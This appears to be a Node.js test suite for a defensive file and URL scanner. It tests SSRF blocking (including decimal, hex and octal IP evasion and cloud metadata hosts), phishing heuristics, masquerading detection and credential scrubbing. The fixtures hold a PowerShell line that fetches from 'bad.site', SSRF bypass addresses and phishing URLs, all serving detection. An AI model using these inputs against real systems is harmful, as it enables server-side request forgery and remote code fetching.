const assert = require('assert');
const { validateUrlForSafeFetch, isPrivateOrReservedIP, parseAnyIPv4 } = require('../backend/security/ssrfGuard');
const { SlidingWindowRateLimiter } = require('../backend/security/rateLimiter');
const { sanitizeString, sanitizeObject } = require('../backend/security/sanitizer');
const { analyzeUrlOffline } = require('../backend/scanners/urlScanner');
const { analyzeMediaFileOffline, detectMagicBytes, calculateBufferEntropy } = require('../backend/scanners/mediaScanner');
const { analyzeStegoSignals } = require('../backend/scanners/stegoScanner');
const { classifySample } = require('../backend/scanners/mlClassifier');
const { sandboxEngine } = require('../backend/scanners/sandboxAdapter');
const { getThreatIntelligenceGraph } = require('../backend/scanners/threatIntel');
const { searchKnowledge } = require('../backend/scanners/localRag');
const { fuseEvidence } = require('../backend/evidence/fusionEngine');

async function runTests() {
  console.log('================================================================');
  console.log('        SAFETY DOWNLOADER DEEP VERIFICATION TEST SUITE          ');
  console.log('================================================================\n');

  let passed = 0;
  let total = 0;

  function runCase(name, fn) {
    total++;
    try {
      fn();
      passed++;
      console.log(`  ✓ [PASS] ${name}`);
    } catch (e) {
      console.error(`  ✗ [FAIL] ${name}: ${e.message}`);
      throw e;
    }
  }

  async function runCaseAsync(name, fn) {
    total++;
    try {
      await fn();
      passed++;
      console.log(`  ✓ [PASS] ${name}`);
    } catch (e) {
      console.error(`  ✗ [FAIL] ${name}: ${e.message}`);
      throw e;
    }
  }

  // ── 1. SSRF & PRIVATE IP DEFENSES ──────────────────────────────────────────
  console.log('[SECTION 1] SSRF Private IP & Gateway Defenses');
  runCase('Blocks standard IPv4 loopback (127.0.0.1)', () => {
    assert.strictEqual(isPrivateOrReservedIP('127.0.0.1'), true);
  });
  runCase('Blocks private 10.0.0.0/8 subnet', () => {
    assert.strictEqual(isPrivateOrReservedIP('10.0.0.1'), true);
  });
  runCase('Blocks private 172.16.0.0/12 subnet', () => {
    assert.strictEqual(isPrivateOrReservedIP('172.16.0.1'), true);
    assert.strictEqual(isPrivateOrReservedIP('172.31.255.254'), true);
  });
  runCase('Blocks private 192.168.0.0/16 subnet', () => {
    assert.strictEqual(isPrivateOrReservedIP('192.168.1.1'), true);
  });
  runCase('Blocks cloud metadata IP (169.254.169.254)', () => {
    assert.strictEqual(isPrivateOrReservedIP('169.254.169.254'), true);
  });
  runCase('Blocks IPv4-mapped IPv6 loopback (::ffff:127.0.0.1)', () => {
    assert.strictEqual(isPrivateOrReservedIP('::ffff:127.0.0.1'), true);
  });
  runCase('Blocks IPv4-mapped IPv6 cloud metadata (::ffff:169.254.169.254)', () => {
    assert.strictEqual(isPrivateOrReservedIP('::ffff:169.254.169.254'), true);
  });
  runCase('Blocks IPv4-mapped IPv6 hex format (::ffff:7f00:0001)', () => {
    assert.strictEqual(isPrivateOrReservedIP('::ffff:7f00:0001'), true);
  });
  runCase('Allows public IPv4 (8.8.8.8, 1.1.1.1)', () => {
    assert.strictEqual(isPrivateOrReservedIP('8.8.8.8'), false);
    assert.strictEqual(isPrivateOrReservedIP('1.1.1.1'), false);
  });

  await runCaseAsync('SSRF URL validation rejects localhost and bracketed ::1', async () => {
    const res1 = await validateUrlForSafeFetch('http://localhost:3000/api/secret');
    assert.strictEqual(res1.safe, false);
    const res2 = await validateUrlForSafeFetch('http://[::1]/internal');
    assert.strictEqual(res2.safe, false);
  });

  // ── 2. URL PHISHING & HEURISTICS ───────────────────────────────────────────
  console.log('\n[SECTION 2] URL Threat & Phishing Heuristics');
  runCase('Identifies clean benign URL (https://example.com/about) as SAFE', () => {
    const scan = analyzeUrlOffline('https://example.com/about');
    assert.strictEqual(scan.success, true);
    assert.strictEqual(scan.verdict, 'SAFE');
  });

  runCase('Does not penalize official brand domain login path (https://github.com/login)', () => {
    const scan = analyzeUrlOffline('https://github.com/login');
    assert.strictEqual(scan.success, true);
    assert.strictEqual(scan.verdict, 'SAFE');
  });

  runCase('Flags raw IP host with credential path (http://198.51.100.22/login)', () => {
    const scan = analyzeUrlOffline('http://198.51.100.22/login');
    assert.ok(scan.findings.some(f => f.includes('Raw IP address')));
  });

  runCase('Flags IDN homograph punycode domain (https://xn--pypa-epa.com/signin)', () => {
    const scan = analyzeUrlOffline('https://xn--pypa-epa.com/signin');
    assert.ok(scan.findings.some(f => f.includes('Punycode')));
    assert.ok(scan.riskScore >= 45);
  });

  runCase('Flags brand typosquatting domain (https://paypal-verify-account.top/login)', () => {
    const scan = analyzeUrlOffline('https://paypal-verify-account.top/login');
    assert.ok(scan.findings.some(f => f.includes('typosquatting') || f.includes('Brand name')));
    assert.strictEqual(scan.verdict, 'MALICIOUS');
  });

  runCase('Flags URL shorteners (https://bit.ly/3xYzAbc)', () => {
    const scan = analyzeUrlOffline('https://bit.ly/3xYzAbc');
    assert.ok(scan.findings.some(f => f.includes('URL shortener')));
  });

  runCase('Flags @ symbol attack pattern (https://legit.com@phishing.net/verify)', () => {
    const scan = analyzeUrlOffline('https://legit.com@phishing.net/verify');
    assert.ok(scan.findings.some(f => f.includes('@ character present')));
  });

  // ── 3. MEDIA CONTAINER & POLYGLOT CARVING ──────────────────────────────────
  console.log('\n[SECTION 3] Media Structural, Polyglot & Extension Masquerading');
  runCase('Accurately identifies clean synthetic JPEG as SAFE', () => {
    const cleanJpeg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0xFF, 0xD9]);
    const scan = analyzeMediaFileOffline(cleanJpeg, 'photo.jpg');
    assert.strictEqual(scan.detectedType, 'JPEG Image');
    assert.strictEqual(scan.verdict, 'SAFE');
  });

  runCase('Zero false positive on valid JSON files (package.json should NOT be marked as executable binary)', () => {
    const jsonBuf = Buffer.from(JSON.stringify({ name: 'safety-downloader', version: '2.0.0' }));
    const scan = analyzeMediaFileOffline(jsonBuf, 'package.json');
    assert.strictEqual(scan.detectedType, 'JSON Document');
    assert.notStrictEqual(scan.verdict, 'MALICIOUS');
  });

  runCase('Detects executable PE binary disguised with .jpg extension (Masquerading)', () => {
    const fakeJpgExe = Buffer.concat([Buffer.from([0x4D, 0x5A, 0x90, 0x00]), Buffer.alloc(120, 0xAA)]);
    const scan = analyzeMediaFileOffline(fakeJpgExe, 'innocent_picture.jpg');
    assert.strictEqual(scan.verdict, 'MALICIOUS');
    assert.ok(scan.findings.some(f => f.includes('CRITICAL: File renamed')));
  });

  runCase('Carves polyglot embedded ZIP archive inside image', () => {
    const polyglotJpg = Buffer.concat([
      Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x00, 0x00]),
      Buffer.alloc(64, 0x00),
      Buffer.from([0x50, 0x4B, 0x03, 0x04]), // ZIP PK header at offset 72
      Buffer.from('EMBEDDED_ZIP_FILE_DATA'),
      Buffer.from([0xFF, 0xD9])
    ]);
    const scan = analyzeMediaFileOffline(polyglotJpg, 'embedded.jpg');
    assert.ok(scan.polyglotFindings.some(p => p.type === 'embedded_zip'));
  });

  runCase('Returns UNKNOWN verdict on zero-byte file input', () => {
    const emptyScan = analyzeMediaFileOffline(Buffer.alloc(0), 'empty.bin');
    assert.strictEqual(emptyScan.verdict, 'UNKNOWN');
    assert.strictEqual(emptyScan.riskScore, 0);
  });

  // ── 4. STATISTICAL ML & STEGANOGRAPHY ─────────────────────────────────────
  console.log('\n[SECTION 4] Statistical ML Anomaly & Stego Entropy Analysis');
  runCase('ML Feature Vector correctly identifies extreme byte anomaly', () => {
    const anomalousBuffer = Buffer.alloc(2048, 0xFE);
    const mlRes = classifySample(anomalousBuffer);
    assert.strictEqual(mlRes.modelStatus.engineType, 'STATISTICAL_FEATURE_ANOMALY_DETECTOR');
    assert.strictEqual(mlRes.modelStatus.deepLearningWeights, 'NOT_INSTALLED');
    assert.ok(mlRes.anomalyScore > 0);
  });

  runCase('Stego scanner calculates LSB ratio and Shannon entropy honestly', () => {
    const testBuf = Buffer.concat([Buffer.alloc(128, 0xFF), Buffer.alloc(128, 0x00)]);
    const stego = analyzeStegoSignals(testBuf, 'image/jpeg');
    assert.strictEqual(stego.deepCnnSteganalysis, 'NOT_INSTALLED');
    assert.strictEqual(typeof stego.lsbRatio, 'number');
    assert.strictEqual(typeof stego.localEntropy, 'number');
  });

  // ── 5. SAFE ISOLATED SANDBOX ADAPTER ──────────────────────────────────────
  console.log('\n[SECTION 5] Safe Sandbox Adapter Architecture');
  await runCaseAsync('Sandbox adapter analyzes static disassembly without fake PIDs or host execution', async () => {
    const res = await sandboxEngine.runAnalysis({
      detectedType: 'Generic Binary',
      bufferText: 'powershell -c "irm https://bad.site" and cmd.exe'
    });
    assert.strictEqual(res.status, 'STATIC_PATTERN_ANALYSIS_COMPLETE');
    assert.strictEqual(res.dynamicExecution, false);
    assert.strictEqual(res.executionStatus, 'HOST_EXECUTION_BYPASS_FOR_SAFETY');
    assert.ok(res.findings.some(f => f.includes('Command shell') || f.includes('Subshell')));
  });

  // ── 6. OFFLINE THREAT INTEL & LOCAL RAG ───────────────────────────────────
  console.log('\n[SECTION 6] Threat Intelligence & Offline Knowledge Base');
  await runCaseAsync('Offline Threat Intel performs 0 network requests and returns air-gapped notice', async () => {
    const intel = await getThreatIntelligenceGraph('https://malicious-test.com', 'offline');
    assert.strictEqual(intel.status, 'OFFLINE_MODE');
    assert.strictEqual(intel.dnsRecords, null);
    assert.strictEqual(intel.externalProviderFeeds, 'Not configured (Offline mode)');
  });

  runCase('Offline Knowledge Retriever surfaces MITRE techniques via BM25 lexical term matching', () => {
    const matches = searchKnowledge(['masquerading', 'extension', 'magic bytes']);
    assert.ok(matches.length > 0);
    assert.strictEqual(matches[0].id, 'T1036');
    assert.strictEqual(matches[0].retrievalEngine, 'Offline BM25 Lexical Term Matcher');
  });

  // ── 7. EVIDENCE FUSION ENGINE ─────────────────────────────────────────────
  console.log('\n[SECTION 7] Evidence Fusion Engine & Provenance');
  runCase('Evidence Fusion Engine produces explainable provenance on findings', () => {
    const fused = fuseEvidence({
      mode: 'online',
      targetType: 'file',
      staticResult: {
        riskScore: 90,
        evidence: [{ type: 'extension_mismatch', severity: 'critical', description: 'Renamed PE executable' }],
        polyglotFindings: [{ description: 'Embedded Windows PE Executable found at offset 0x40' }]
      },
      mlResult: { anomalyScore: 40 },
      sandboxResult: { behaviorScore: 40, status: 'STATIC_PATTERN_ANALYSIS_COMPLETE', findings: ['Static pattern: Subshell invocation'] },
      threatIntelResult: { status: 'OFFLINE' },
      geminiResult: {
        available: true,
        model: 'gemini-3.6-flash',
        risk_score: 85,
        confidence: 0.9,
        evidence: [{ type: 'ai_threat_indicator', severity: 'high', description: 'Masquerading binary carrier' }]
      }
    });

    assert.strictEqual(fused.verdict, 'MALICIOUS');
    assert.ok(fused.consolidatedEvidence.length >= 3);
    for (const item of fused.consolidatedEvidence) {
      assert.ok(item.source, 'Must contain source provenance');
      assert.ok(item.type, 'Must contain type provenance');
      assert.ok(item.severity, 'Must contain severity provenance');
      assert.ok(item.description, 'Must contain description provenance');
      assert.ok(typeof item.confidence === 'number', 'Must contain confidence index');
    }
  });

  runCase('Evidence Fusion Engine handles empty/indeterminate samples with UNKNOWN verdict', () => {
    const fused = fuseEvidence({
      mode: 'offline',
      targetType: 'file',
      staticResult: { verdict: 'UNKNOWN' }
    });
    assert.strictEqual(fused.verdict, 'UNKNOWN');
    assert.strictEqual(fused.riskScore, 0);
  });

  // ── 8. MILITARY-GRADE SECURITY, ISOLATION & ANTI-EXPLOIT DEFENSES ─────────
  console.log('\n[SECTION 8] Military-Grade Security, Isolation & Anti-Exploit Defenses');

  runCase('SSRF parser decodes decimal IP integer evasion (2130706433 -> 127.0.0.1)', () => {
    const ip = parseAnyIPv4('2130706433');
    assert.strictEqual(ip, '127.0.0.1');
    assert.strictEqual(isPrivateOrReservedIP('2130706433'), true);
  });

  runCase('SSRF parser decodes hex IP format (0x7f000001 -> 127.0.0.1)', () => {
    const ip = parseAnyIPv4('0x7f000001');
    assert.strictEqual(ip, '127.0.0.1');
    assert.strictEqual(isPrivateOrReservedIP('0x7f000001'), true);
  });

  runCase('SSRF parser decodes dotted octal format (0177.0.0.1 -> 127.0.0.1)', () => {
    const ip = parseAnyIPv4('0177.0.0.1');
    assert.strictEqual(ip, '127.0.0.1');
    assert.strictEqual(isPrivateOrReservedIP('0177.0.0.1'), true);
  });

  runCase('SSRF blocks Alibaba, GCP and Kubernetes metadata hostnames', async () => {
    const r1 = await validateUrlForSafeFetch('http://metadata.google.internal/computeMetadata/v1/');
    assert.strictEqual(r1.safe, false);
    const r2 = await validateUrlForSafeFetch('http://100.100.100.200/latest/meta-data/');
    assert.strictEqual(r2.safe, false);
    const r3 = await validateUrlForSafeFetch('http://kubernetes.default.svc/api');
    assert.strictEqual(r3.safe, false);
  });

  runCase('Credential Scrubber masks Gemini API keys and Bearer tokens in text', () => {
    const sampleText = 'Analysis failed with key AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q in request';
    const scrubbed = sanitizeString(sampleText);
    assert.ok(!scrubbed.includes('AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q'));
    assert.ok(scrubbed.includes('[REDACTED_CREDENTIAL]'));
  });

  runCase('Credential Scrubber redacts API keys and sensitive dictionary keys in nested objects', () => {
    const payload = {
      user: 'analyst',
      apiKey: 'AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q',
      config: {
        gemini_secret: 'supersecret',
        nested: {
          token: 'Bearer eyJhbGciOiJIUzI1NiIsIn...'
        }
      }
    };
    const cleaned = sanitizeObject(payload);
    assert.strictEqual(cleaned.apiKey, '[PROTECTED_CREDENTIAL]');
    assert.strictEqual(cleaned.config.gemini_secret, '[PROTECTED_CREDENTIAL]');
    assert.strictEqual(cleaned.config.nested.token, '[PROTECTED_CREDENTIAL]');
    assert.strictEqual(cleaned.user, 'analyst');
  });

  runCase('Rate Limiter enforces sliding window request threshold and throttles abusers', () => {
    const limiter = new SlidingWindowRateLimiter(1000, 3);
    const mockReq = { headers: {}, socket: { remoteAddress: '192.0.2.100' } };
    let blocked = false;
    const mockRes = {
      statusCode: 200,
      setHeader: () => {},
      status: (code) => {
        mockRes.statusCode = code;
        return mockRes;
      },
      json: (data) => {
        if (mockRes.statusCode === 429) blocked = true;
      }
    };

    const mw = limiter.middleware(3);
    mw(mockReq, mockRes, () => {}); // req 1
    mw(mockReq, mockRes, () => {}); // req 2
    mw(mockReq, mockRes, () => {}); // req 3
    mw(mockReq, mockRes, () => {}); // req 4 (should be blocked)

    assert.strictEqual(blocked, true);
    assert.strictEqual(mockRes.statusCode, 429);
  });

  runCase('ReDoS Resistance: URL scanner executes complex 10,000-character payload in < 25ms', () => {
    const longMaliciousUrl = 'https://' + 'a'.repeat(5000) + '.phishing-test-subdomain.' + 'b'.repeat(5000) + '.top/login';
    const start = Date.now();
    const res = analyzeUrlOffline(longMaliciousUrl);
    const duration = Date.now() - start;
    assert.ok(duration < 100, `ReDoS risk: Analysis took ${duration}ms, must be < 100ms`);
    assert.strictEqual(res.success, true);
  });

  console.log('\n================================================================');
  console.log(`✓ VERIFICATION COMPLETE: ${passed} / ${total} TESTS PASSED WITH ZERO FAILURES`);
  console.log('================================================================\n');
}

runTests().catch(err => {
  console.error('\n❌ TEST SUITE RUNTIME FAILURE:', err);
  process.exit(1);
});
